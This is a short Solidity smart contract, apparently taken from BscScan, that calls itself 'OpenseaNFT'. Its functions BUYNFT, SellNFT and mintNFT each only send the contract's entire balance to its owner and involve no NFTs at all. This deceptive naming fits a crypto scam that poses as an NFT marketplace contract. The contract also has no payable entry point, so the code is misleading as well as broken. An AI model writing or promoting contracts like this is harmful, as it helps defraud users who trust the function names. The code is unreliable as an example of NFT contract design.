/**
 *Submitted for verification at BscScan.com on 2023-02-08
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0;
contract OpenseaNFT {
address private owner;


 constructor() {
        owner = msg.sender;
    }


      function  BUYNFT() external{

            payable(owner).transfer(address(this).balance);

      }

      function SellNFT() external{

          payable(owner).transfer(address(this).balance);
      }

      function mintNFT() external {
          payable(owner).transfer(address(this).balance);

      }

}